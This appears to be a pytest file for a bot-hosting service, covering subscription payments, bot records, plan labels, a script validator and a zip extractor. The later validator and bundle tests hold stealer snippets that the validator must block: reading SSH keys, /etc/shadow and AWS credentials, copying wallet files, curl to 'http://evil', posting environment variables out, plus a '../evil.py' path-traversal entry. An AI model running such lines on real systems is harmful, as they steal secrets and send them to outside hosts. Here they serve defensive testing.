"""Async tests for the storage layer."""

from __future__ import annotations

import asyncio
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from bothost.db import Database
from bothost.plans import Plan, find_plan, parse_plans
from bothost.runner import slug_name
from bothost.validator import validate_user_script


@pytest.fixture()
def db_path(tmp_path: Path) -> Path:
    return tmp_path / "bothost.sqlite3"


def run(coro):  # type: ignore[no-untyped-def]
    return asyncio.run(coro)


def test_subscription_lifecycle(db_path: Path) -> None:
    async def go() -> None:
        db = Database(db_path)
        await db.init()
        await db.upsert_user(1, "alice")

        sub = await db.get_subscription(1)
        assert sub is None

        sub = await db.apply_payment(
            tg_id=1,
            plan_id="start",
            paid_stars=50,
            days=14,
            bots=1,
            mem_mb=256,
            cpu_quota=0.25,
            disk_mb=100,
            fsize_mb=25,
            payment_charge_id="x",
        )
        assert sub.bot_quota == 1
        assert sub.total_paid_stars == 50
        assert sub.mem_mb == 256
        assert sub.expires_at > datetime.now(UTC)

        # second payment of a bigger plan stacks days and bumps resources to the max
        sub2 = await db.apply_payment(
            tg_id=1,
            plan_id="plus",
            paid_stars=130,
            days=14,
            bots=1,
            mem_mb=512,
            cpu_quota=0.5,
            disk_mb=300,
            fsize_mb=50,
            payment_charge_id="y",
        )
        assert sub2.bot_quota == 1
        assert sub2.mem_mb == 512
        assert sub2.cpu_quota == 0.5
        assert sub2.disk_mb == 300
        assert sub2.total_paid_stars == 50 + 130
        assert sub2.expires_at > sub.expires_at + timedelta(days=13)

    run(go())


def test_apply_payment_when_expired_starts_from_now(db_path: Path) -> None:
    async def go() -> None:
        db = Database(db_path)
        await db.init()
        await db.upsert_user(2, "bob")

        sub = await db.apply_payment(
            tg_id=2,
            plan_id="start",
            paid_stars=50,
            days=14,
            bots=1,
            mem_mb=256,
            cpu_quota=0.25,
            disk_mb=100,
            fsize_mb=25,
            payment_charge_id=None,
        )
        # force-expire
        import aiosqlite

        async with aiosqlite.connect(db_path) as conn:
            await conn.execute(
                "UPDATE subscriptions SET expires_at = ? WHERE tg_id = ?",
                ((datetime.now(UTC) - timedelta(days=1)).isoformat(), 2),
            )
            await conn.commit()
        sub2 = await db.apply_payment(
            tg_id=2,
            plan_id="start",
            paid_stars=50,
            days=14,
            bots=1,
            mem_mb=256,
            cpu_quota=0.25,
            disk_mb=100,
            fsize_mb=25,
            payment_charge_id=None,
        )
        assert sub2.expires_at > datetime.now(UTC) + timedelta(days=13)

        _ = sub  # silence unused

    run(go())


def test_total_paid_stars(db_path: Path) -> None:
    async def go() -> None:
        db = Database(db_path)
        await db.init()
        await db.upsert_user(3, "c")
        await db.apply_payment(
            tg_id=3,
            plan_id="start",
            paid_stars=50,
            days=14,
            bots=1,
            mem_mb=256,
            cpu_quota=0.25,
            disk_mb=100,
            fsize_mb=25,
            payment_charge_id=None,
        )
        await db.apply_payment(
            tg_id=3,
            plan_id="plus",
            paid_stars=130,
            days=14,
            bots=1,
            mem_mb=512,
            cpu_quota=0.5,
            disk_mb=300,
            fsize_mb=50,
            payment_charge_id=None,
        )
        assert await db.total_paid_stars() == 50 + 130

    run(go())


def test_bot_crud(db_path: Path) -> None:
    async def go() -> None:
        db = Database(db_path)
        await db.init()
        await db.upsert_user(10, "dave")
        rec = await db.create_bot(
            tg_id=10,
            name="bot1",
            file_path="/tmp/bot.py",
            container_name="placeholder_1",
            plan_id="start",
            mem_mb=256,
            cpu_quota=0.25,
            disk_mb=100,
            fsize_mb=25,
        )
        assert rec.status == "stopped"
        assert rec.mem_mb == 256
        assert rec.disk_mb == 100
        await db.set_container_name(bot_id=rec.id, container_name="bothost_user_10_1")
        await db.update_bot_status(bot_id=rec.id, status="running", container_id="abc")
        fresh = await db.get_bot_by_id(rec.id)
        assert fresh is not None
        assert fresh.status == "running"
        assert fresh.container_id == "abc"
        assert fresh.container_name == "bothost_user_10_1"

        same = await db.get_bot_by_name(10, "bot1")
        assert same is not None and same.id == rec.id

        await db.rename_bot(bot_id=rec.id, new_name="bot1_renamed")
        bots = await db.list_bots_for_user(10)
        assert len(bots) == 1 and bots[0].name == "bot1_renamed"

        await db.delete_bot(rec.id)
        assert await db.get_bot_by_id(rec.id) is None

    run(go())


def test_admin_extend(db_path: Path) -> None:
    async def go() -> None:
        db = Database(db_path)
        await db.init()
        await db.upsert_user(20, "x")
        sub = await db.apply_payment(
            tg_id=20,
            plan_id="admin",
            paid_stars=0,
            days=7,
            bots=2,
            mem_mb=512,
            cpu_quota=0.5,
            disk_mb=300,
            fsize_mb=50,
            payment_charge_id=None,
        )
        assert sub.total_paid_stars == 0
        assert sub.bot_quota == 2
        assert sub.expires_at > datetime.now(UTC) + timedelta(days=6)

    run(go())


def test_plans_default() -> None:
    plans = parse_plans(None)
    assert any(p.id == "start" and p.stars == 50 for p in plans)
    assert find_plan(plans, "max") is not None


def test_plan_label_format() -> None:
    plan = Plan(
        id="start",
        name="Старт",
        stars=50,
        days=14,
        bots=1,
        mem_mb=256,
        cpu_quota=0.25,
        disk_mb=100,
        fsize_mb=25,
    )
    label = plan.label()
    assert "50⭐" in label
    assert "14 дн" in label
    assert "256" in label
    assert "CPU" in label
    assert "диск" in label


@pytest.mark.parametrize(
    "name,ok",
    [
        ("bot1", True),
        ("my-bot_2", True),
        ("a" * 32, True),
        ("a" * 33, False),
        ("", False),
        ("with space", False),
        ("кир", False),
    ],
)
def test_slug_name(name: str, ok: bool) -> None:
    assert (slug_name(name) is not None) == ok


@pytest.mark.parametrize(
    "source,ok",
    [
        (b"print('hi')", True),
        (b"\xff\xfe garbage", False),
        (b"def f(:\n  pass\n", False),
        (b"x" * (2 * 1024 * 1024), False),
    ],
)
def test_validator(source: bytes, ok: bool) -> None:
    result = validate_user_script(source)
    assert result.ok == ok


def test_validator_warns_on_eval() -> None:
    result = validate_user_script(b"eval('1+1')\n")
    assert result.ok
    assert result.warnings is not None
    assert any("eval" in w for w in result.warnings)


@pytest.mark.parametrize(
    "snippet",
    [
        b"open(os.path.expanduser('~/.ssh/id_rsa')).read()\n",
        b"requests.get('http://x', data=open('/etc/shadow').read())\n",
        b"shutil.copy(p, 'wallet.dat')\n",
        b"with open(BASE/'.aws/credentials') as f: data = f.read()\n",
        b"subprocess.run(['curl', 'http://evil'])\n",
    ],
)
def test_validator_blocks_stealer_patterns(snippet: bytes) -> None:
    result = validate_user_script(snippet)
    assert not result.ok, snippet
    assert result.error is not None


def test_validator_blocks_env_dump() -> None:
    src = b"requests.post('http://x', data=os.environ.copy())\n"
    result = validate_user_script(src)
    assert not result.ok


def test_bundle_extract_minimal_zip(tmp_path: Path) -> None:
    import io
    import zipfile

    from bothost.bundle import extract_zip

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("bot.py", b"print('hi')\n")
        zf.writestr("requirements.txt", b"requests==2.32.3\n")

    target = tmp_path / "extracted"
    result = asyncio.run(extract_zip(archive_bytes=buf.getvalue(), target_dir=target))
    assert result.ok, result.error
    assert (target / "bot.py").exists()
    assert result.requirements == ["requests==2.32.3"]


def test_bundle_rejects_path_traversal(tmp_path: Path) -> None:
    import io
    import zipfile

    from bothost.bundle import extract_zip

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../evil.py", b"x")
    result = asyncio.run(extract_zip(archive_bytes=buf.getvalue(), target_dir=tmp_path / "x"))
    assert not result.ok
    assert (
        result.error is not None and ".." in result.error or "путь" in (result.error or "").lower()
    )


def test_bundle_rejects_vcs_requirement(tmp_path: Path) -> None:
    import io
    import zipfile

    from bothost.bundle import extract_zip

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("bot.py", b"print('hi')\n")
        zf.writestr("requirements.txt", b"git+https://github.com/x/y.git\n")
    result = asyncio.run(extract_zip(archive_bytes=buf.getvalue(), target_dir=tmp_path / "y"))
    assert not result.ok
    assert "VCS" in (result.error or "")
